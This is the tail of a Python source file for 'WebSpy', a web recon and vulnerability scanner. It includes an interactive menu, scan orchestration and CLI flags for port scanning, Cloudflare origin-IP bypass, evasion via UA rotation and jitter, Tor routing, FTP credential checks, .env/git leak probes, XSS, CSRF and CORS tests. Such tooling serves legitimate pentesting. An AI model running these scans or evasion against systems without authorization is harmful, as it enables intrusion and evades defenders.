                    crit(f"CORS CRITICAL: Origin={origin} reflected + Allow-Credentials=true")
                    crit("  This allows full cross-origin credential theft!")
                    findings.append({"type": "cors_critical", "origin": origin})
                else:
                    warn(f"CORS: {origin} reflected in ACAO header")
                    findings.append({"type": "cors_reflect", "origin": origin})

    if not findings:
        info("No API endpoints found publicly")
    return findings


# ── Output Manager ────────────────────────────────────────────────────────────

def save_results(outfile=None, json_file=None, domain="", all_findings=None):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if outfile:
        with open(outfile, "w") as f:
            f.write(f"WebSpy Report — {domain} — {ts}\n")
            f.write("="*60 + "\n\n")
            for line in results_store:
                f.write(line + "\n")
        ok(f"Results saved → {outfile}")
    if json_file and all_findings:
        all_findings["timestamp"] = ts
        all_findings["target"]    = domain
        with open(json_file, "w") as f:
            json.dump(all_findings, f, indent=2)
        ok(f"JSON report  → {json_file}")

# ── Interactive Menu ──────────────────────────────────────────────────────────

def interactive_mode():
    banner()
    print(f"{W}{'─'*60}{NC}")
    print(f"{BY} Interactive Mode — Answer to configure your scan{NC}")
    print(f"{W}{'─'*60}{NC}\n")

    target = input(f"{C}[?]{NC} Enter target domain or IP: {G}").strip()
    print(NC, end="")
    if not target:
        err("No target provided"); sys.exit(1)

    print(f"""
{W}Select scan mode:{NC}
  {G}[1]{NC} Passive OSINT      (no direct contact)
  {G}[2]{NC} Active Scan
  {G}[3]{NC} Cloudflare Bypass  (origin IP discovery)
  {G}[4]{NC} Full Scan          (all modules) ← recommended""")
    mode_choice = input(f"\n{C}[?]{NC} Mode [1-4, default 4]: {G}").strip() or "4"
    print(NC, end="")
    mode_map = {"1":"passive","2":"active","3":"bypass","4":"full"}
    mode = mode_map.get(mode_choice, "full")

    t_input = input(f"\n{C}[?]{NC} Timing -T [1=Stealth → 5=Insane, default 3]: {G}").strip() or "3"
    print(NC, end="")
    t_level = int(t_input) if t_input.isdigit() and 1 <= int(t_input) <= 5 else 3

    evasion = input(f"\n{C}[?]{NC} Enable evasion? UA rotation + timing jitter [y/N]: {G}").strip().lower() == "y"
    print(NC, end="")

    depth_in = input(f"\n{C}[?]{NC} Crawl depth [1-5, default 2]: {G}").strip() or "2"
    print(NC, end="")
    depth = int(depth_in) if depth_in.isdigit() and 1 <= int(depth_in) <= 5 else 2

    outfile = input(f"\n{C}[?]{NC} Save output to file? (enter filename or leave blank): {G}").strip()
    print(NC, end="")

    print(f"\n{W}{'─'*60}{NC}")
    print(f"{C} Target :{NC} {W}{target}{NC}")
    print(f"{C} Mode   :{NC} {W}{mode}{NC}")
    print(f"{C} Timing :{NC} {W}T{t_level} — {TIMING[t_level]['name']}{NC}")
    print(f"{C} Evasion:{NC} {W}{'ON' if evasion else 'OFF'}{NC}")
    print(f"{C} Depth  :{NC} {W}{depth}{NC}")
    print(f"{W}{'─'*60}{NC}\n")

    confirm = input(f"{C}[?]{NC} Start scan? [Y/n]: {G}").strip().lower()
    print(NC, end="")
    if confirm == "n":
        sys.exit(0)

    # Build a namespace to reuse run_scan
    class Opts:
        pass
    opts = Opts()
    opts.target   = target
    opts.mode     = mode
    opts.T        = t_level
    opts.evasion  = evasion
    opts.depth    = depth
    opts.output   = outfile if outfile else None
    opts.json     = None
    opts.verbose  = False
    opts.quiet    = False
    opts.proxy    = None
    opts.tor      = False
    opts.ports    = None
    opts.sub      = mode == "full"
    opts.dir      = mode == "full"
    opts.tcp      = mode in ["active","full"]
    opts.udp      = False
    opts.ping     = True
    opts.cf       = mode in ["bypass","full"]
    opts.s3       = mode == "full"
    opts.headers  = mode in ["active","full"]
    opts.waf      = True
    opts.tech     = mode in ["active","full"]
    opts.js       = mode == "full"
    opts.php      = mode in ["active","full"]
    opts.nikto    = False
    opts.whois    = mode in ["passive","full"]

    # Security / vuln modules
    print(f"\n{W}Security Modules (choose which to run):{NC}")
    print(f"  {G}[a]{NC} All security modules (recommended for full pentest)")
    print(f"  {G}[n]{NC} None (skip all security modules)")
    print(f"  {G}[c]{NC} Custom — pick individually")
    sec_choice = input(f"\n{C}[?]{NC} Security modules [a/n/c, default a]: {G}").strip().lower() or "a"
    print(NC, end="")

    if sec_choice == "a" or mode == "full":
        opts.ftp       = True
        opts.ssh       = True
        opts.sensitive = True
        opts.cookie    = True
        opts.xss       = True
        opts.csrf      = True
        opts.api       = True
    elif sec_choice == "c":
        opts.ftp       = input(f"  {C}FTP anonymous/default login check?{NC} [y/N]: ").strip().lower() == "y"
        opts.ssh       = input(f"  {C}SSH banner + auth methods?{NC} [y/N]: ").strip().lower() == "y"
        opts.sensitive = input(f"  {C}Sensitive file leaks (.env, git, backups)?{NC} [y/N]: ").strip().lower() == "y"
        opts.cookie    = input(f"  {C}Cookie & session security analysis?{NC} [y/N]: ").strip().lower() == "y"
        opts.xss       = input(f"  {C}XSS / DOM sinks / SSTI detection?{NC} [y/N]: ").strip().lower() == "y"
        opts.csrf      = input(f"  {C}CSRF + Broken Access Control + IDOR?{NC} [y/N]: ").strip().lower() == "y"
        opts.api       = input(f"  {C}API endpoints + CORS + GraphQL?{NC} [y/N]: ").strip().lower() == "y"
    else:
        opts.ftp=opts.ssh=opts.sensitive=opts.cookie=opts.xss=opts.csrf=opts.api=False

    return opts

# ── Main Scanner ──────────────────────────────────────────────────────────────

def run_scan(opts):
    banner()
    domain  = opts.target.replace("https://","").replace("http://","").split("/")[0]
    t_level = opts.T
    evasion = opts.evasion
    depth   = opts.depth
    proxy   = opts.proxy
    if opts.tor:
        proxy = "127.0.0.1:9050"

    verbose = opts.verbose
    all_findings = {}

    print(f"\n{W}{'═'*60}{NC}")
    print(f"{C} Target  : {W}{domain}{NC}")
    print(f"{C} Mode    : {W}{opts.mode if hasattr(opts,'mode') else 'custom'}{NC}")
    print(f"{C} Timing  : {W}T{t_level} — {TIMING[t_level]['name']} ({TIMING[t_level]['desc']}){NC}")
    print(f"{C} Evasion : {W}{'ON — UA rotation, jitter, fragmentation' if evasion else 'OFF'}{NC}")
    print(f"{C} Depth   : {W}{depth}{NC}")
    print(f"{C} Started : {W}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{NC}")
    print(f"{W}{'═'*60}{NC}")

    if opts.ping or getattr(opts,"mode","") in ["active","full"]:
        all_findings["host"] = host_check(domain, verbose)

    if opts.whois or getattr(opts,"mode","") in ["passive","full"]:
        all_findings["passive"] = passive_recon(domain, verbose)

    if opts.waf:
        all_findings["waf"] = waf_detect(domain, verbose)

    if opts.tech:
        all_findings["tech"] = tech_detect(domain, verbose)

    if opts.cf or getattr(opts,"mode","") == "bypass":
        all_findings["origins"] = cf_bypass(domain, evasion, proxy, verbose)

    if opts.sub:
        all_findings["subdomains"] = subdomain_enum(domain, depth, t_level, verbose)

    if opts.tcp:
        ports = opts.ports if opts.ports else "top1000"
        all_findings["tcp"] = port_scan(domain, ports, "tcp", t_level, evasion, verbose)

    if opts.udp:
        ports = opts.ports if opts.ports else "100"
        all_findings["udp"] = port_scan(domain, ports, "udp", t_level, evasion, verbose)

    if opts.dir:
        all_findings["dirs"] = dir_bust(domain, depth, t_level, evasion, proxy, verbose)

    if opts.s3:
        all_findings["s3"] = s3_scan(domain, t_level, verbose)

    if opts.headers:
        all_findings["headers"] = headers_audit(domain, evasion, proxy, verbose)

    if opts.js:
        all_findings["js"] = js_analysis(domain, depth, evasion, proxy, verbose)

    if opts.php:
        all_findings["php"] = php_scan(domain, evasion, proxy, verbose)

    if opts.nikto:
        all_findings["nikto"] = nikto_scan(domain, t_level, proxy, verbose)

    px = getattr(opts, "payload_xss",  None)
    pf = getattr(opts, "payload_ftp",  None)
    pc = getattr(opts, "payload_csrf", None)

    if getattr(opts, "ftp", False):
        all_findings["ftp"] = ftp_check(domain, verbose, payload_file=pf)

    if getattr(opts, "ssh", False):
        all_findings["ssh"] = ssh_check(domain, verbose)

    if getattr(opts, "sensitive", False):
        all_findings["sensitive"] = sensitive_info(domain, evasion, proxy, verbose)

    if getattr(opts, "cookie", False):
        all_findings["cookie"] = cookie_session_analysis(domain, evasion, proxy, verbose)

    if getattr(opts, "xss", False):
        all_findings["xss"] = xss_check(domain, evasion, proxy, verbose, payload_file=px)

    if getattr(opts, "csrf", False):
        all_findings["csrf"] = csrf_bac_check(domain, evasion, proxy, verbose, payload_file=pc)

    if getattr(opts, "api", False):
        all_findings["api"] = api_discovery(domain, evasion, proxy, verbose)

    # Summary
    head("SCAN COMPLETE — SUMMARY")
    print(f"  Target    : {W}{domain}{NC}")
    print(f"  Finished  : {W}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{NC}")
    print(f"  Findings  : {G}{len(results_store)}{NC} total\n")

    save_results(
        outfile   = opts.output,
        json_file = opts.json if hasattr(opts,"json") else None,
        domain    = domain,
        all_findings = all_findings
    )

# ── Argument Parser ───────────────────────────────────────────────────────────

def main():
    if len(sys.argv) == 1:
        opts = interactive_mode()
        run_scan(opts)
        return

    if sys.argv[1] in ("-h","--help","help"):
        show_help(); return

    if sys.argv[1] in ("-V","--version"):
        print(f"WebSpy v{VERSION} by Silentium Noctis"); return

    p = argparse.ArgumentParser(add_help=False)
    p.add_argument("-t","--target",  required=True)
    p.add_argument("-m","--mode",    default="custom",
                   choices=["passive","active","bypass","full","custom"])
    p.add_argument("-T",             type=int, default=3, choices=[1,2,3,4,5])
    p.add_argument("-e","--evasion", action="store_true")
    p.add_argument("-D","--depth",   type=int, default=2)
    p.add_argument("-p","--ports",   default=None)
    p.add_argument("--proxy",        default=None)
    p.add_argument("--tor",          action="store_true")
    # Modules
    p.add_argument("--sub",     action="store_true")
    p.add_argument("--dir",     action="store_true")
    p.add_argument("--tcp",     action="store_true")
    p.add_argument("--udp",     action="store_true")
    p.add_argument("--ping",    action="store_true")
    p.add_argument("--cf",      action="store_true")
    p.add_argument("--s3",      action="store_true")
    p.add_argument("--headers", action="store_true")
    p.add_argument("--waf",     action="store_true")
    p.add_argument("--tech",    action="store_true")
    p.add_argument("--js",      action="store_true")
    p.add_argument("--php",     action="store_true")
    p.add_argument("--nikto",     action="store_true")
    p.add_argument("--whois",     action="store_true")
    p.add_argument("--ftp",       action="store_true")
    p.add_argument("--ssh",       action="store_true")
    p.add_argument("--sensitive", action="store_true")
    p.add_argument("--cookie",    action="store_true")
    p.add_argument("--xss",       action="store_true")
    p.add_argument("--csrf",      action="store_true")
    p.add_argument("--api",       action="store_true")
    # Custom payload files
    p.add_argument("--px", "--payload-xss",  dest="payload_xss",  default=None,
                   metavar="FILE", help="Custom XSS payload file (.txt)")
    p.add_argument("--pf", "--payload-ftp",  dest="payload_ftp",  default=None,
                   metavar="FILE", help="Custom FTP credential file (user:pass per line)")
    p.add_argument("--pc", "--payload-csrf", dest="payload_csrf", default=None,
                   metavar="FILE", help="Custom admin/CSRF path file (.txt)")
    # Output
    p.add_argument("-o","--output",  default=None)
    p.add_argument("-j","--json",    default=None)
    p.add_argument("-v","--verbose", action="store_true")
    p.add_argument("-q","--quiet",   action="store_true")
    p.add_argument("-h","--help",    action="store_true")

    opts = p.parse_args()
    if opts.help:
        show_help(); return

    # If full/passive/active/bypass mode, auto-enable relevant modules
    if opts.mode == "full":
        opts.sub=opts.dir=opts.tcp=opts.ping=opts.cf=True
        opts.s3=opts.headers=opts.waf=opts.tech=opts.js=opts.php=opts.whois=True
        opts.ftp=opts.ssh=opts.sensitive=opts.cookie=opts.xss=opts.csrf=opts.api=True
    elif opts.mode == "passive":
        opts.whois = True
    elif opts.mode == "active":
        opts.tcp=opts.ping=opts.headers=opts.tech=opts.waf=opts.php=True
        opts.sensitive=opts.cookie=opts.xss=opts.csrf=opts.api=True
    elif opts.mode == "bypass":
        opts.cf=opts.waf=opts.headers=True

    run_scan(opts)


if __name__ == "__main__":
    main()
